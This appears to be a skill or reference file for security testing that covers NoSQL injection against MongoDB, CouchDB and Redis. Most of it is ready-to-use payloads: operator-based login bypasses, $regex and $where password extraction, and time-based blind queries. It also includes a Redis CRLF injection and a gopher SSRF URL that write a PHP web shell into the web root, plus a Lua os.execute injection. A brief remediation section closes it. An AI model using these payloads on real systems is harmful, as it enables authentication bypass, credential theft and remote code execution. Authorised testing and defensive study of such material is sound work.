---
name: nosql-injection
description: NoSQL injection testing covering MongoDB, CouchDB, and Redis with operator injection, authentication bypass, and blind extraction techniques
---

# NoSQL Injection

NoSQL injection exploits the query languages and data models of non-relational databases. Unlike SQL injection, it targets JSON-based query operators, JavaScript execution contexts, and key-value command interfaces. The attack surface differs per database but the principle is the same: user input modifies query logic.

## Attack Surface

**Databases**
- Document stores: MongoDB, CouchDB, Elasticsearch
- Key-value: Redis, Memcached
- Wide-column: Cassandra (CQL injection)
- Graph: Neo4j (Cypher injection)

**Contexts**
- REST APIs accepting JSON bodies, query string parameters parsed into objects, GraphQL resolvers, server-side JavaScript evaluation, ORM/ODM query builders

**Input Locations**
- JSON body fields, query parameters (Express `req.query` auto-parsing), URL path segments, headers/cookies deserialized into objects

**Defenses to Bypass**
- Input type validation, query operator stripping, parameterized queries, WAF rules targeting `$` operators

## Key Vulnerabilities

### MongoDB Operator Injection

When user input is parsed into an object (common in Express/Node.js), operators can replace string values:

**Authentication Bypass:**
```json
POST /login
{"username": {"$ne": ""}, "password": {"$ne": ""}}
```
This matches any document where username and password are not empty — returns the first user (often admin).

**Alternative bypass with $gt:**
```json
{"username": "admin", "password": {"$gt": ""}}
```

**Query parameter exploitation (Express auto-parsing):**
```
GET /users?username[$ne]=&password[$gt]=
```
Express parses this into `{username: {$ne: ""}, password: {$gt: ""}}`.

### MongoDB $regex Data Extraction

Extract data character by character:
```json
{"username": "admin", "password": {"$regex": "^a"}}
{"username": "admin", "password": {"$regex": "^ab"}}
{"username": "admin", "password": {"$regex": "^abc"}}
```
Boolean response differences reveal each character. Automate with binary search on character ranges.

### MongoDB $where JavaScript Injection

When `$where` is used, JavaScript executes server-side:
```json
{"$where": "this.username == 'admin' && sleep(5000)"}
```

**Time-based extraction:**
```json
{"$where": "if(this.password.charAt(0)=='a'){sleep(5000)}else{return false}"}
```

**Data exfiltration:**
```json
{"$where": "this.username=='admin' && this.password.match(/^a.*/)"}
```

### MongoDB Aggregation Pipeline Injection

If user input reaches aggregation stages:
```json
{"$lookup": {"from": "users", "localField": "_id", "foreignField": "_id", "as": "leaked"}}
```

### CouchDB

**Mango Query Injection:**
```json
{"selector": {"username": "admin", "password": {"$gt": null}}}
```

**View function injection (if custom views accept user input):**
```javascript
emit(doc._id, doc.password)  // injected into map function
```

### Redis Command Injection

When user input is concatenated into Redis commands:
```
SET user:input "value"\r\nCONFIG SET dir /var/www/html\r\nCONFIG SET dbfilename shell.php\r\n
SET user:input "<?php system($_GET['cmd']); ?>"
SAVE
```

**SSRF to Redis via gopher:**
```
gopher://127.0.0.1:6379/_*3%0d%0a$3%0d%0aSET%0d%0a$4%0d%0ashell%0d%0a$30%0d%0a<?php system($_GET['cmd']); ?>%0d%0a*1%0d%0a$4%0d%0aSAVE%0d%0a
```

**Lua script injection (EVAL command):**
```
EVAL "redis.call('set','key',KEYS[1])" 1 "'); os.execute('id'); --"
```

## Blind NoSQL Injection

### Boolean-Based

Inject operators that change the truth value of queries and observe response differences:
```json
// True condition — returns data
{"id": {"$gt": ""}}

// False condition — returns empty
{"id": {"$gt": "zzzzz"}}
```

### Time-Based

Use `$where` with `sleep()` or computationally expensive operations:
```json
{"$where": "if(this.secret.charAt(0)>'a'){sleep(5000);return true}else{return false}"}
```

### Error-Based

Trigger type errors or operator misuse that reveals information in error messages:
```json
{"id": {"$invalidOperator": 1}}
```

## Bypass Techniques

- **Unicode/encoding**: `\u0024ne` for `$ne` when `$` is stripped
- **Nested objects**: `{"password": {"$not": {"$eq": "wrong"}}}` as alternative to `$ne`
- **Array injection**: `{"password": {"$in": ["pass1", "pass2", ...]}}` for dictionary attacks
- **Type juggling**: send integers where strings expected, or arrays where objects expected
- **BSON injection**: manipulate raw BSON when binary protocols are used
- **Query parameter pollution**: duplicate parameters to override sanitized values

## Testing Methodology

1. **Identify database** — error messages, technology stack, response patterns (MongoDB ObjectId format `^[a-f0-9]{24}$`)
2. **Test operator injection** — inject `{"$ne":""}`, `{"$gt":""}`, `{"$regex":".*"}` in each field
3. **Test query string parsing** — try `param[$ne]=` and `param[$gt]=` in URL parameters
4. **Authentication bypass** — target login endpoints with operator payloads
5. **Establish boolean oracle** — find injection points where true/false conditions produce different responses
6. **Extract data** — use `$regex` with anchored patterns to extract values character by character
7. **Test JavaScript contexts** — inject `$where` payloads for time-based or error-based extraction
8. **Test Redis/other stores** — if Redis is in the stack, test CRLF injection in command construction

## Indicators of Vulnerability

- Login bypassed with `{"$ne":""}` operator in password field
- Different response sizes/status codes when using `$gt`/`$lt` with varying values
- MongoDB error messages revealing query structure or operator parsing
- Time delays when injecting `sleep()` via `$where`
- ObjectId or BSON-related errors in responses

## Remediation

- Cast all user inputs to expected types before query construction (string, number, boolean)
- Strip or reject any input containing `$` prefixed keys at the application layer
- Use MongoDB query projection and field validation; avoid `$where` entirely
- Use parameterized queries and ODM methods that enforce types (Mongoose schema validation)
- Disable server-side JavaScript execution (`--noscripting` in MongoDB)
- For Redis, use parameterized command APIs (never string concatenation)
- Apply least-privilege database roles; restrict access to admin commands

## Summary

NoSQL injection targets the query semantics of document stores, key-value databases, and their JavaScript evaluation contexts. The most common vector is operator injection through JSON/query parameter parsing. Cast input types, reject operator-prefixed keys, and avoid server-side JavaScript evaluation.
